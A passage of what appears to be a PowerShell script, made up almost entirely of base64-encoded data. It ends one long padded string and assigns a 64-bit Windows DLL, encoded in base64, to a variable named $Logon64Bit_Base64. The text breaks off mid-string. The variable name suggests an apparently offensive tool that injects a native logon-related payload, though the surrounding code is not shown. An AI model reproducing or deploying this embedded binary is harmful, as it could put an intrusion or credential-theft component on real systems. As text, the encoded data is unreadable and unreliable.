AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
        $Logon64Bit_Base64 = "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